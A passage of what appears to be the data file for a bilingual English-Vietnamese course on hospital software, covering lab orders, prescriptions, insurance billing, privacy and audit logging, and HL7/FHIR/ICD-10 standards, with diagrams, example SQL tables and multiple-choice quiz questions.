VI: Bác sĩ tạo một **chỉ định**. Đó là yêu cầu làm xét nghiệm hoặc chụp chiếu cho một người bệnh trong một lượt khám.`},{type:"text",text:`**HIS** is the hospital information system: patients, orders and billing. **LIS** is the lab system. **PACS** stores and shows medical images. They send messages to each other.
VI: **HIS** là hệ thống thông tin bệnh viện: người bệnh, chỉ định và viện phí. **LIS** là hệ thống xét nghiệm. **PACS** lưu trữ và hiển thị hình ảnh y khoa. Các hệ thống gửi thông điệp cho nhau.`},{type:"diagram",text:`      HIS (hospital system)
   orders, records, billing
     │   ▲            │   ▲
order│   │result order│   │report
     ▼   │            ▼   │
   LIS (lab)        PACS (images)
     │   ▲            │   ▲
     ▼   │            ▼   │
   Analyzer         CT / X-ray
   (máy XN)         (máy chụp)`},{type:"text",text:`The lab prints a **barcode** on each tube. The barcode links the tube to the order, and the order to the patient.
VI: Phòng xét nghiệm in **mã vạch** lên từng ống mẫu. Mã vạch nối ống mẫu với chỉ định, và chỉ định với người bệnh.`},{type:"diagram",text:`pending ──► preliminary ──► final
(chờ)       (sơ bộ)         (chính thức)
                               │
                               ▼
                           corrected
                           (đã hiệu chỉnh)`},{type:"text",text:`A corrected result must not silently replace the old value. Keep both versions and mark the new one as corrected. Tell the doctor who already read the old one.
VI: Kết quả hiệu chỉnh không được âm thầm ghi đè giá trị cũ. Giữ cả hai phiên bản và đánh dấu bản mới là đã hiệu chỉnh. Báo cho bác sĩ đã đọc bản cũ.`},{type:"example",title:"A critical value at 2 a.m.",text:`At 2 a.m. the lab finds a dangerously abnormal result. This is a **critical value** (giá trị nguy hiểm). An email is not enough. The system must alert a person and record who confirmed it. If nobody confirms in time, it alerts the next person.
VI: Lúc 2 giờ sáng, phòng xét nghiệm thấy một kết quả bất thường nguy hiểm. Đó là **giá trị nguy hiểm**. Gửi email là không đủ. Hệ thống phải báo cho một người và ghi lại ai đã xác nhận. Nếu không ai xác nhận kịp, hệ thống báo người tiếp theo.`},{type:"code",code:{lang:"sql",text:`CREATE TABLE LabResult (
  Id         BIGINT PRIMARY KEY,
  OrderId    BIGINT NOT NULL,
  TestCode   VARCHAR(20) NOT NULL,
  Value      NVARCHAR(50),
  Unit       VARCHAR(20),
  Status     CHAR(1),  -- P, F, C
  IsCritical BIT NOT NULL,
  AckBy      INT NULL, -- who confirmed
  AckAt      DATETIME2 NULL,
  ReplacesId BIGINT NULL -- old version
);`}}],remember:`Order → sample → result. Keep every version, and make sure critical values reach a person.
VI: Chỉ định → mẫu → kết quả. Giữ mọi phiên bản, và đảm bảo giá trị nguy hiểm đến được tay một người.`,questions:[{id:"healthcare.orders-results.1",kind:"mcq",difficulty:"easy",prompt:`A doctor orders a blood test. Which system usually runs the work inside the lab?
VI: Bác sĩ chỉ định xét nghiệm máu. Hệ thống nào thường quản lý công việc bên trong phòng xét nghiệm?`,choices:["PACS","LIS","The billing module","DICOM"],answer:1,why:`The LIS receives the order, tracks samples and talks to the analyzers. PACS is for images, and DICOM is an image format.
VI: LIS nhận chỉ định, theo dõi mẫu và kết nối với máy xét nghiệm. PACS dành cho hình ảnh, còn DICOM là định dạng ảnh.`},{id:"healthcare.orders-results.2",kind:"scenario",difficulty:"medium",prompt:`The lab finds an error in a final result and sends a corrected value. The doctor already read the old one. What should the system do?
VI: Phòng xét nghiệm phát hiện sai sót ở kết quả chính thức và gửi giá trị đã hiệu chỉnh. Bác sĩ đã đọc bản cũ. Hệ thống nên làm gì?`,choices:["Overwrite the value so the screen shows only the newest","Keep both, mark it corrected and notify the doctor","Reject the change, because final results are locked","Delete the old result and ask the doctor to re-order"],answer:1,why:`The doctor may have acted on the old value, so they must know it changed. Keeping both versions also shows what was known at each time.
VI: Bác sĩ có thể đã xử trí theo giá trị cũ, nên phải biết là nó đã đổi. Giữ cả hai phiên bản cũng cho thấy ở mỗi thời điểm người ta biết gì.`},{id:"healthcare.orders-results.3",kind:"debug",difficulty:"hard",prompt:`Sometimes CT images appear under the wrong patient in PACS. The orders in HIS are correct. What is the most likely cause?
VI: Đôi khi ảnh CT hiện dưới tên người bệnh khác trong PACS. Chỉ định trên HIS vẫn đúng. Nguyên nhân khả dĩ nhất là gì?`,choices:["The technician types the patient ID by hand at the CT machine","PACS stores the images in a compressed file format","The CT machine uses a different time zone than HIS","The doctor ordered the CT before the patient paid"],answer:0,why:`Typing IDs by hand causes typos and wrong picks. The machine should receive the patient list from the orders, called a worklist. Then the technician only picks, never types.
VI: Gõ tay mã người bệnh dễ sai và dễ chọn nhầm. Máy chụp nên nhận danh sách người bệnh từ chỉ định, gọi là worklist. Khi đó kỹ thuật viên chỉ chọn, không phải gõ.`},{id:"healthcare.orders-results.4",kind:"truefalse",difficulty:"easy",prompt:`A preliminary result can look exactly the same as a final result on the screen.
VI: Kết quả sơ bộ có thể hiển thị giống hệt kết quả chính thức trên màn hình.`,choices:["True","False"],answer:1,why:`A preliminary value may still change. The doctor must see the status clearly, so they do not treat it as final.
VI: Giá trị sơ bộ vẫn có thể thay đổi. Bác sĩ phải thấy rõ trạng thái để không coi đó là kết quả chính thức.`}]},{id:"healthcare.prescriptions",title:"Prescriptions and the pharmacy · Kê đơn và nhà thuốc",summary:`Structured doses, safety checks, and stock by lot and expiry.
VI: Liều thuốc có cấu trúc, kiểm tra an toàn, và tồn kho theo lô, hạn dùng.`,minutes:5,blocks:[{type:"text",text:`A prescription line has separate fields: drug, dose, unit, frequency and duration. Do not store it as one free-text line. The numbers below are only an example, not medical advice.
VI: Một dòng đơn thuốc gồm các trường riêng: thuốc, liều, đơn vị, số lần dùng và số ngày. Đừng lưu thành một dòng chữ tự do. Các con số dưới đây chỉ là ví dụ, không phải lời khuyên y khoa.`},{type:"diagram",text:`One line (một dòng đơn thuốc)
┌──────────┬──────┬──────┬────────┬──────┐
│ Drug     │ Dose │ Unit │ Freq.  │ Days │
├──────────┼──────┼──────┼────────┼──────┤
│ Drug X   │ 500  │ mg   │ 2/day  │ 5    │
└──────────┴──────┴──────┴────────┴──────┘
If 1 tablet = 500 mg:
Quantity = 1 × 2 × 5 = 10 tablets`},{type:"text",text:`Before saving, the system checks two things. Is the patient **allergic** (dị ứng) to this drug? Does it **interact** (tương tác) badly with another drug the patient takes?
VI: Trước khi lưu, hệ thống kiểm tra hai điều. Người bệnh có **dị ứng** với thuốc này không? Thuốc có **tương tác** xấu với thuốc khác mà người bệnh đang dùng không?`},{type:"diagram",text:`1 mg = 1000 mcg (microgram)

Doctor means:  0.5 mg = 500 mcg
Screen unit:   mg  (default)
Typed:         500
Saved:         500 mg
Result:        1000 times too much`},{type:"example",title:"The silent default unit",text:`An old screen had a dose box and a unit that defaulted to mg. A nurse typed 500, thinking in mcg. Nothing warned her. A simple maximum-dose check would have stopped it.
VI: Một màn hình cũ có ô liều và đơn vị mặc định là mg. Điều dưỡng gõ 500 vì nghĩ theo mcg. Không có cảnh báo nào. Chỉ cần kiểm tra liều tối đa là đã chặn được lỗi này.`},{type:"list",items:["Store dose and unit in separate fields.","Never let the unit default silently.","Check each dose against a maximum set by pharmacists.","No trailing zero: write 5 mg, not 5.0 mg.","Always a leading zero: write 0.5 mg, not .5 mg.","Too many weak warnings make doctors ignore all of them."]},{type:"text",text:`The pharmacy keeps stock by **lot** (số lô) and **expiry date** (hạn dùng). It gives out the lot that expires first. Each dispense records the lot, so a recalled lot can be traced to patients.
VI: Nhà thuốc quản lý tồn kho theo **số lô** và **hạn dùng**. Lô nào hết hạn trước thì xuất trước. Mỗi lần cấp phát đều ghi số lô, để khi thu hồi một lô có thể truy ra người bệnh.`},{type:"diagram",text:`Drug X stock (tồn kho)
┌────────┬────────────┬─────┐
│ Lot    │ Expiry     │ Qty │
├────────┼────────────┼─────┤
│ L-2401 │ 2026-12-31 │  40 │ ← out first
│ L-2405 │ 2027-06-30 │ 200 │
└────────┴────────────┴─────┘
FEFO = first expiry, first out`}],remember:`Structured doses, clear units, real checks. Track every drug by lot and expiry.
VI: Liều có cấu trúc, đơn vị rõ ràng, kiểm tra thật sự. Theo dõi mọi thuốc theo số lô và hạn dùng.`,questions:[{id:"healthcare.prescriptions.1",kind:"debug",difficulty:"hard",prompt:`A patient received 1000 times the intended dose. The doctor meant 0.5 mg. The record says 500 mg. What is the most likely bug?
VI: Một người bệnh nhận liều gấp 1000 lần dự định. Bác sĩ muốn 0,5 mg. Hồ sơ ghi 500 mg. Lỗi khả dĩ nhất là gì?`,choices:["The value was typed in mcg, but the unit was mg","The database rounded 0.5 up to the next integer","The pharmacy gave out an expired lot of the drug","The order was sent twice by a double click"],answer:0,why:`500 mcg equals 0.5 mg. Typed with a default unit of mg, it becomes 1000 times too much. Rounding would give 1, not 500.
VI: 500 mcg bằng 0,5 mg. Nếu gõ với đơn vị mặc định là mg, liều sẽ gấp 1000 lần. Làm tròn chỉ cho ra 1, không phải 500.`},{id:"healthcare.prescriptions.2",kind:"debug",difficulty:"medium",prompt:`A patient’s allergy to Drug X is written in the doctor’s notes. Drug X was prescribed, but no alert appeared. Why?
VI: Dị ứng thuốc X của người bệnh được ghi trong ghi chú của bác sĩ. Thuốc X vẫn được kê mà không có cảnh báo. Vì sao?`,choices:["Allergy checks only work for inpatients","The allergy is free text, so the check cannot read it","The alert was sent to the pharmacy printer","Drug X has no lot number in the stock table"],answer:1,why:`An automatic check needs a coded allergy linked to a drug or drug group. A note in free text is invisible to it.
VI: Kiểm tra tự động cần dị ứng được mã hóa, gắn với thuốc hoặc nhóm thuốc. Ghi chú dạng chữ tự do thì hệ thống không đọc được.`},{id:"healthcare.prescriptions.3",kind:"compare",difficulty:"medium",prompt:`Which way of storing a prescription line is better for safety?
VI: Cách lưu dòng đơn thuốc nào an toàn hơn?`,choices:['One text column: "Drug X 500mg x2 5d"',"Separate columns: drug, dose, unit, frequency, days","One JSON blob that only the screen understands"],answer:1,why:`Separate fields let the system check the dose, the unit and the quantity. Free text and hidden blobs cannot be checked reliably.
VI: Các trường riêng giúp hệ thống kiểm tra liều, đơn vị và số lượng. Chữ tự do hay khối dữ liệu ẩn thì không kiểm tra tin cậy được.`},{id:"healthcare.prescriptions.4",kind:"scenario",difficulty:"medium",prompt:`The maker recalls lot L-2405 of Drug X. The hospital must find every patient who got it. What data makes this possible?
VI: Nhà sản xuất thu hồi lô L-2405 của thuốc X. Bệnh viện phải tìm mọi người bệnh đã nhận lô này. Dữ liệu nào giúp làm được việc đó?`,choices:["The lot number saved on each dispense record","The total stock count at the end of each month","The drug name on each prescription line","The supplier’s invoice for the drug purchase"],answer:0,why:`Only a lot number on each dispense links a patient to a specific lot. The drug name alone matches every lot of that drug.
VI: Chỉ có số lô ghi trên từng lần cấp phát mới nối người bệnh với một lô cụ thể. Chỉ có tên thuốc thì khớp với mọi lô của thuốc đó.`},{id:"healthcare.prescriptions.5",kind:"truefalse",difficulty:"easy",prompt:`FEFO means the pharmacy gives out the lot that arrived first.
VI: FEFO nghĩa là nhà thuốc xuất lô nhập về trước.`,choices:["True","False"],answer:1,why:`FEFO is first expiry, first out. A lot that arrived later may expire sooner, and it should go out first.
VI: FEFO là hết hạn trước, xuất trước. Một lô nhập sau vẫn có thể hết hạn sớm hơn, và nên được xuất trước.`}]},{id:"healthcare.insurance-billing",title:"Insurance and billing · Bảo hiểm y tế và viện phí",summary:`Who pays which part of the bill, and how claims can fail.
VI: Ai trả phần nào của hóa đơn, và hồ sơ đề nghị thanh toán có thể hỏng ở đâu.`,minutes:5,blocks:[{type:"text",text:`Health insurance (BHYT) pays part of the cost of covered services. The patient pays the rest. Services that are not covered are paid fully by the patient.
VI: Bảo hiểm y tế (BHYT) chi trả một phần chi phí cho các dịch vụ trong phạm vi được hưởng. Người bệnh cùng chi trả phần còn lại. Dịch vụ ngoài phạm vi thì người bệnh tự trả toàn bộ.`},{type:"diagram",text:`Visit bill (example only)
┌─────────────────────────┬───────────┐
│ Service                 │ Price VND │
├─────────────────────────┼───────────┤
│ Exam (covered)          │   100,000 │
│ Blood test (covered)    │   300,000 │
│ Drugs (covered)         │   600,000 │
│ Extra service (no BHYT) │   500,000 │
└─────────────────────────┴───────────┘
Covered total       = 1,000,000
BHYT pays 80%       =   800,000
Patient pays 20%    =   200,000
+ not covered       =   500,000
Patient pays total  =   700,000`},{type:"text",text:`The 80% is only an example. The real share depends on the case, for example the card group and the hospital. The developer gets these rules from the business and from official rules.
VI: Mức 80% chỉ là ví dụ. Tỷ lệ thật phụ thuộc từng trường hợp, ví dụ nhóm đối tượng trên thẻ và nơi khám. Lập trình viên phải lấy các quy tắc này từ nghiệp vụ và văn bản chính thức.`},{type:"text",text:`Each service has a code and a price in a **price list** (bảng giá). One service may have a BHYT price and a different service price. Prices change, so each bill line stores the price used on that day.
VI: Mỗi dịch vụ có mã và giá trong **bảng giá**. Một dịch vụ có thể có giá BHYT và giá dịch vụ khác nhau. Giá thay đổi theo thời gian, nên mỗi dòng viện phí lưu giá áp dụng tại ngày đó.`},{type:"code",code:{lang:"sql",text:`CREATE TABLE ServicePrice (
  ServiceCode VARCHAR(20) NOT NULL,
  PriceType   VARCHAR(10) NOT NULL, -- BHYT/SVC
  Price       DECIMAL(18,0) NOT NULL,
  ValidFrom   DATE NOT NULL,
  ValidTo     DATE NULL
);
-- BillLine copies Price and InsurancePct.
-- Never join to today's price for old bills.`}},{type:"text",text:`The hospital sends **claims** (hồ sơ đề nghị thanh toán) electronically to the social insurance agency (BHXH). The agency reviews them. It can reject lines it will not pay, and the hospital loses that money.
VI: Bệnh viện gửi dữ liệu đề nghị thanh toán điện tử cho cơ quan BHXH. Cơ quan BHXH giám định dữ liệu. Các dòng không hợp lệ có thể bị xuất toán, và bệnh viện mất khoản tiền đó.`},{type:"diagram",text:`Draft → Sent → Under review → Accepted
                    │
                    ▼
             Rejected lines
             (bị xuất toán)
                    │
                    ▼
          Fix and resend, if allowed`},{type:"example",title:"Common billing errors",text:`The insurance card had expired on the visit date. The same test was billed twice after a double click. An old bill was reprinted with the new price. Each one costs money or trust.
VI: Thẻ BHYT đã hết hạn vào ngày khám. Cùng một xét nghiệm bị tính hai lần do bấm đúp. Hóa đơn cũ được in lại với giá mới. Lỗi nào cũng làm mất tiền hoặc mất lòng tin.`},{type:"list",items:["Ask: what share does BHYT pay for each case?","Ask: how do we round each line and the total?","Ask: who pays if the card is not valid that day?","Ask: can a bill change after the patient has paid?"]}],remember:`Store the price and the insurance share used on the day. Never recalculate old bills from today’s rules.
VI: Lưu giá và tỷ lệ BHYT áp dụng tại ngày đó. Không bao giờ tính lại hóa đơn cũ theo quy tắc hôm nay.`,questions:[{id:"healthcare.insurance-billing.1",kind:"mcq",difficulty:"easy",prompt:`Covered services cost 2,000,000 VND. In this example BHYT pays 80% of them. A service with no BHYT costs 300,000 VND. How much does the patient pay?
VI: Dịch vụ trong phạm vi BHYT là 2.000.000 đồng. Trong ví dụ này BHYT trả 80%. Một dịch vụ ngoài BHYT giá 300.000 đồng. Người bệnh trả bao nhiêu?`,choices:["400,000 VND","700,000 VND","300,000 VND","1,900,000 VND"],answer:1,why:`The patient pays 20% of 2,000,000, which is 400,000. Then they also pay the full 300,000 for the uncovered service. Total: 700,000.
VI: Người bệnh trả 20% của 2.000.000 là 400.000. Thêm 300.000 cho dịch vụ ngoài phạm vi. Tổng cộng: 700.000.`},{id:"healthcare.insurance-billing.2",kind:"debug",difficulty:"medium",prompt:`Prices changed on 1 July. Bills from June, printed again today, now show the new prices. What is the likely cause?
VI: Giá thay đổi từ ngày 1/7. Hóa đơn tháng 6 in lại hôm nay lại hiện giá mới. Nguyên nhân có thể là gì?`,choices:["The printer caches the newest price list","The bill joins to the current price, not a saved one","The June bills were never sent to BHXH","The database time zone is set to UTC"],answer:1,why:`The bill line should store the price used on the service date. Joining to the live price list rewrites history when prices change.
VI: Dòng viện phí phải lưu giá áp dụng vào ngày thực hiện dịch vụ. Nối sang bảng giá hiện hành sẽ làm thay đổi lịch sử khi giá đổi.`},{id:"healthcare.insurance-billing.3",kind:"scenario",difficulty:"medium",prompt:`The same blood test appears twice on a bill. The doctor clicked "Order" twice. What is the best fix?
VI: Cùng một xét nghiệm máu xuất hiện hai lần trên hóa đơn. Bác sĩ đã bấm "Chỉ định" hai lần. Cách sửa tốt nhất là gì?`,choices:["Ask cashiers to check every bill by eye","Block double submits, and warn on the same test the same day","Never allow the same test twice for one patient, ever","Delete the second line from the bill each night"],answer:1,why:`Stop the double click at the source, and warn on a likely repeat. A full ban is wrong, because some tests are really repeated. Ask the business which tests may repeat.
VI: Chặn bấm đúp ngay từ gốc, và cảnh báo khi có khả năng trùng. Cấm hẳn là sai, vì có xét nghiệm thật sự cần làm lại. Hãy hỏi nghiệp vụ xét nghiệm nào được lặp.`},{id:"healthcare.insurance-billing.4",kind:"truefalse",difficulty:"easy",prompt:`BHYT always pays the same percentage for every patient, so it can be a constant in the code.
VI: BHYT luôn trả cùng một tỷ lệ cho mọi người bệnh, nên có thể để là hằng số trong code.`,choices:["True","False"],answer:1,why:`The share depends on the case, for example the card group. The rules can also change over time. Keep them as data with dates, not as a constant.
VI: Tỷ lệ phụ thuộc từng trường hợp, ví dụ nhóm đối tượng trên thẻ. Quy tắc cũng có thể đổi theo thời gian. Hãy lưu thành dữ liệu có ngày hiệu lực, không phải hằng số.`}]},{id:"healthcare.safety-privacy",title:"Safety, privacy and uptime · An toàn, bảo mật và vận hành liên tục",summary:`Who may see a record, why nothing is deleted, and what to do when the system is down.
VI: Ai được xem hồ sơ, vì sao không xóa gì, và làm gì khi hệ thống ngừng hoạt động.`,minutes:5,blocks:[{type:"text",text:`Health data is very sensitive. A leaked diagnosis can hurt a person for life. So staff should see only what they need for their work. This is **need-to-know** access.
VI: Dữ liệu sức khỏe rất nhạy cảm. Một chẩn đoán bị lộ có thể gây hại cả đời cho một người. Vì vậy nhân viên chỉ nên xem những gì cần cho công việc. Đây là nguyên tắc **cần mới được biết**.`},{type:"diagram",text:`Doctor A → patient in her ward    ✓
Doctor A → patient in another ward
           → "break the glass"
             reason required
             logged, reviewed later
Cashier  → lab result details      ✗
Cashier  → bill and BHYT number    ✓`},{type:"text",text:`**Break the glass** is emergency access. The user gives a reason, gets in, and the access is reviewed later. An **audit log** records who viewed or changed which record, and when.
VI: **Break the glass** là quyền truy cập khẩn cấp. Người dùng nhập lý do, được vào, và việc truy cập được rà soát sau. **Nhật ký truy cập** ghi lại ai đã xem hoặc sửa hồ sơ nào, vào lúc nào.`},{type:"code",code:{lang:"sql",text:`CREATE TABLE AuditLog (
  Id        BIGINT PRIMARY KEY,
  UserId    INT NOT NULL,
  PatientId INT NOT NULL,
  Action    VARCHAR(10), -- VIEW/EDIT/PRINT
  Reason    NVARCHAR(200) NULL,
  At        DATETIME2 NOT NULL
);
-- Log reads too, not only writes.`}},{type:"compare",left:{title:"Hard delete ❌",items:["The row is gone","No one can see what was there","Breaks the legal medical record"]},right:{title:"Mark as error ✅",items:["Status = entered in error","Old value kept, hidden from normal views","Who and why are logged"]}},{type:"text",text:`Hospitals work all night, every day. When the system is down, staff switch to a **downtime procedure**: paper forms and printed lists. Later they enter the paper data back. Backups only count if a restore was tested.
VI: Bệnh viện làm việc cả ngày lẫn đêm. Khi hệ thống ngừng, nhân viên chuyển sang **quy trình dự phòng**: biểu mẫu giấy và danh sách in sẵn. Sau đó họ nhập lại dữ liệu từ giấy. Sao lưu chỉ có giá trị khi đã thử khôi phục.`},{type:"example",title:"Network down at 3 a.m.",text:`The network fails at 3 a.m. for two hours. Nurses still need each patient’s current drugs. A read-only copy and a printed drug list each night solve this.
VI: Mạng bị sự cố lúc 3 giờ sáng trong hai tiếng. Điều dưỡng vẫn cần biết thuốc hiện tại của từng người bệnh. Một bản sao chỉ đọc và danh sách thuốc in sẵn mỗi đêm sẽ giải quyết việc này.`},{type:"list",items:["Test extra: the right patient on every screen.","Test extra: units, decimals and maximum doses.","Test extra: allergy and interaction alerts.","Test extra: results reach the right patient and doctor.","Test extra: double clicks and two users on one record."]}],remember:`Need-to-know access, log every view, never hard delete, and plan for downtime.
VI: Chỉ cấp quyền khi cần, ghi log mọi lượt xem, không xóa cứng, và có kế hoạch cho lúc hệ thống ngừng.`,questions:[{id:"healthcare.safety-privacy.1",kind:"truefalse",difficulty:"easy",prompt:`In a hospital system, it is enough to log changes to a record. Reading a record does not need a log.
VI: Trong hệ thống bệnh viện, chỉ cần ghi log khi sửa hồ sơ. Việc xem hồ sơ không cần ghi log.`,choices:["True","False"],answer:1,why:`Most privacy problems are people looking, not changing. Without view logs, nobody can find who opened a famous patient’s record.
VI: Phần lớn vi phạm quyền riêng tư là do xem, không phải sửa. Không có log lượt xem thì không ai tìm ra người đã mở hồ sơ của một bệnh nhân nổi tiếng.`},{id:"healthcare.safety-privacy.2",kind:"compare",difficulty:"medium",prompt:`A nurse saved a blood pressure value on the wrong patient. How should the system let her fix it?
VI: Điều dưỡng lưu chỉ số huyết áp vào nhầm người bệnh. Hệ thống nên cho sửa như thế nào?`,choices:["Delete the row, so the wrong value is gone for good",'Mark it "entered in error" with a reason, and keep it',"Edit the value to zero, so it looks like it is empty"],answer:1,why:`Someone may already have acted on that value. Keeping it with a clear error status and a reason keeps the record honest and traceable.
VI: Có thể đã có người xử trí theo giá trị đó. Giữ lại với trạng thái lỗi rõ ràng và lý do giúp hồ sơ trung thực và truy vết được.`},{id:"healthcare.safety-privacy.3",kind:"scenario",difficulty:"medium",prompt:`IT plans a 3-hour upgrade at night. The wards still treat patients. What must be ready before it starts?
VI: Bộ phận IT lên kế hoạch nâng cấp 3 tiếng vào ban đêm. Các khoa vẫn điều trị người bệnh. Điều gì phải sẵn sàng trước khi bắt đầu?`,choices:["A message telling staff not to treat patients for 3 hours","Paper forms, printed drug lists and a plan to enter data later","Nothing, because night shifts rarely need the system","A faster server, so the upgrade takes less than 3 hours"],answer:1,why:`Care does not stop for an upgrade. Staff need current information on paper or read-only, and a clear way to bring paper data back into the system.
VI: Việc điều trị không dừng lại vì nâng cấp. Nhân viên cần thông tin hiện tại trên giấy hoặc bản chỉ đọc, và cách rõ ràng để nhập lại dữ liệu giấy vào hệ thống.`},{id:"healthcare.safety-privacy.4",kind:"debug",difficulty:"hard",prompt:`Backups ran every night for a year with no errors. On the day of a disk failure, the restore fails. What was missing?
VI: Việc sao lưu chạy mỗi đêm suốt một năm không lỗi. Đến ngày hỏng ổ đĩa, khôi phục lại thất bại. Điều gì đã bị thiếu?`,choices:["A second backup job at noon every single day","Regular test restores to prove backups work","A bigger and faster disk for the backup files","Stronger compression of the backup files"],answer:1,why:`A backup job can succeed while the files are unusable. Only a real restore test proves you can get the data back.
VI: Tác vụ sao lưu có thể báo thành công dù file không dùng được. Chỉ có thử khôi phục thật mới chứng minh lấy lại được dữ liệu.`}]},{id:"healthcare.standards",title:"Standards and codes · Tiêu chuẩn và bộ mã",summary:`ICD-10, HL7, FHIR and DICOM: a shared language for health systems.
VI: ICD-10, HL7, FHIR và DICOM: ngôn ngữ chung cho các hệ thống y tế.`,minutes:5,blocks:[{type:"text",text:`A hospital runs many systems from many vendors. Without a shared format, every pair of systems needs its own custom link.
VI: Một bệnh viện chạy nhiều hệ thống của nhiều nhà cung cấp. Không có định dạng chung thì mỗi cặp hệ thống cần một kết nối riêng.`},{type:"diagram",text:`No standard:
  each pair has its own format
  5 systems → up to 10 custom links

With a standard (HL7 / FHIR):
  HIS   LIS   PACS   Pharmacy   BHYT
   │     │     │        │        │
   └─────┴─────┴── one format ───┘
  5 systems → 5 adapters`},{type:"text",text:"**ICD-10** is a list of codes for diagnoses. For example, `J18.9` means pneumonia, germ not specified. In Vietnam, BHYT claims need these codes. Reports count codes, not free text.\nVI: **ICD-10** là bộ mã chẩn đoán bệnh. Ví dụ, `J18.9` là viêm phổi, không xác định tác nhân. Ở Việt Nam, dữ liệu thanh toán BHYT cần các mã này. Báo cáo đếm theo mã, không theo chữ tự do."},{type:"diagram",text:`Doctor writes        Code saved
"viêm phổi"     →    J18.9
"Viem phoi"     →    J18.9
"VP"            →    J18.9

Report: count by code, not by text`},{type:"text",text:"**HL7 v2** is an older message format. Each line is a **segment**, and fields are split by `|`. `MSH` is the header, `PID` the patient, `OBX` one result.\nVI: **HL7 v2** là định dạng thông điệp lâu đời. Mỗi dòng là một **segment**, các trường cách nhau bằng `|`. `MSH` là phần đầu, `PID` là người bệnh, `OBX` là một kết quả."},{type:"code",code:{lang:"text",text:`MSH|^~\\&|LIS|LAB|HIS|HOSP|20261008||ORU^R01|1|P|2.5
PID|1||P000123||NGUYEN^VAN AN||19900512|M
OBX|1|NM|GLU^Glucose||5.4|mmol/L|||||F`}},{type:"text",text:`**FHIR** is newer. It uses web APIs and JSON. Each thing is a **resource**, for example Patient, Encounter or Observation. **DICOM** is the standard for medical images. A DICOM file holds the image and data like the patient ID.
VI: **FHIR** mới hơn, dùng web API và JSON. Mỗi đối tượng là một **resource**, ví dụ Patient, Encounter hay Observation. **DICOM** là chuẩn cho hình ảnh y khoa. Một file DICOM chứa cả ảnh và dữ liệu như mã người bệnh.`},{type:"code",code:{lang:"json",text:`{
  "resourceType": "Patient",
  "id": "p-123",
  "identifier": [{
    "system": "urn:example:hospital-id",
    "value": "P000123"
  }],
  "name": [{
    "family": "Nguyen",
    "given": ["Van", "An"]
  }],
  "gender": "male",
  "birthDate": "1990-05-12"
}`}},{type:"example",title:"Connecting a new lab machine",text:`The vendor says the machine "supports HL7". You still must ask: which version, which messages, and which test codes? Most of the work is mapping local codes to the other side.
VI: Nhà cung cấp nói máy "hỗ trợ HL7". Bạn vẫn phải hỏi: phiên bản nào, loại thông điệp nào, và mã xét nghiệm nào? Phần lớn công việc là ánh xạ mã nội bộ sang mã của bên kia.`}],remember:`Standards let systems talk. Codes like ICD-10 make data countable. Mapping is most of the work.
VI: Tiêu chuẩn giúp các hệ thống nói chuyện với nhau. Bộ mã như ICD-10 giúp dữ liệu thống kê được. Ánh xạ mã chiếm phần lớn công việc.`,questions:[{id:"healthcare.standards.1",kind:"code",difficulty:"medium",prompt:"In this HL7 v2 result line, what does the last field `F` mean?\nVI: Trong dòng kết quả HL7 v2 này, trường cuối cùng `F` có nghĩa là gì?",code:{lang:"text",text:"OBX|1|NM|GLU^Glucose||5.4|mmol/L|||||F"},choices:["Female patient","Final result","Failed test","Fasting sample"],answer:1,why:"This field is the result status in `OBX`. `F` means final, `P` means preliminary and `C` means corrected. The patient’s sex is in the `PID` segment, not here.\nVI: Trường này là trạng thái kết quả trong `OBX`. `F` là chính thức, `P` là sơ bộ, `C` là đã hiệu chỉnh. Giới tính người bệnh nằm ở segment `PID`, không phải ở đây."},{id:"healthcare.standards.2",kind:"scenario",difficulty:"easy",prompt:`The director wants the top 10 diagnoses this year. Doctors typed diagnoses as free text. What is the real fix?
VI: Giám đốc muốn xem 10 chẩn đoán hàng đầu năm nay. Bác sĩ nhập chẩn đoán dạng chữ tự do. Cách sửa thật sự là gì?`,choices:["Write a smarter text search for the report","Store an ICD-10 code with every diagnosis","Ask doctors to always type in capital letters","Count only diagnoses longer than ten letters"],answer:1,why:`The same disease is typed in many ways. A standard code gives one value per disease, so counting is easy and correct. BHYT claims need the code too.
VI: Cùng một bệnh được gõ theo nhiều kiểu. Mã chuẩn cho mỗi bệnh một giá trị, nên thống kê dễ và đúng. Dữ liệu BHYT cũng cần mã này.`},{id:"healthcare.standards.3",kind:"debug",difficulty:"medium",prompt:"Your code sends HIS patients to a FHIR server. The server rejects them with an error on `gender`. HIS stores sex as `M` or `F`. What is wrong?\nVI: Code của bạn gửi người bệnh từ HIS sang máy chủ FHIR. Máy chủ từ chối với lỗi ở `gender`. HIS lưu giới tính là `M` hoặc `F`. Sai ở đâu?",choices:["FHIR does not allow a gender field for patients","FHIR expects codes like `male` and `female`, so map them","The FHIR server needs gender sent as a number","The birth date must be sent before the gender"],answer:1,why:"FHIR defines its own codes for gender: `male`, `female`, `other` and `unknown`. Local values must be mapped to them before sending.\nVI: FHIR quy định mã riêng cho giới tính: `male`, `female`, `other` và `unknown`. Giá trị nội bộ phải được ánh xạ sang các mã này trước khi gửi."},{id:"healthcare.standards.4",kind:"compare",difficulty:"hard",prompt:`A team builds a new mobile app that reads patient data through a web API. Which standard fits best?
VI: Một nhóm xây ứng dụng di động mới, đọc dữ liệu người bệnh qua web API. Chuẩn nào phù hợp nhất?`,choices:["HL7 v2 pipe messages","FHIR resources over REST","DICOM files","ICD-10 codes"],answer:1,why:`FHIR was designed for web APIs with JSON, which mobile apps use well. HL7 v2 is for system-to-system messages, DICOM is for images and ICD-10 is only a code list.
VI: FHIR được thiết kế cho web API với JSON, rất hợp với ứng dụng di động. HL7 v2 dành cho thông điệp giữa các hệ thống, DICOM cho hình ảnh, còn ICD-10 chỉ là bộ mã.`}]}],cheatSheet:[{title:"Patient and visit",items:[{term:"Patient ID · Mã người bệnh",meaning:`One unique code per real person
VI: Mỗi người thật có một mã duy nhất`},{term:"Duplicate · Trùng hồ sơ",meaning:`One person with two IDs; history is split
VI: Một người có hai mã; tiền sử bị chia đôi`},{term:"Wrong merge · Gộp nhầm",meaning:`Two people under one ID; very dangerous
VI: Hai người chung một mã; rất nguy hiểm`},{term:"EMR · Bệnh án điện tử",meaning:`The patient record inside one hospital
VI: Hồ sơ bệnh án trong một bệnh viện`},{term:"Encounter · Lượt khám",meaning:`One visit or one stay, with a status
VI: Một lần khám hoặc một đợt điều trị, có trạng thái`},{term:"Outpatient / Inpatient · Ngoại trú / Nội trú",meaning:`Goes home the same day / stays in a bed
VI: Về trong ngày / nằm lại tại khoa`}]},{title:"Orders and results",items:[{term:"Order · Chỉ định",meaning:`Doctor’s request for a test or image
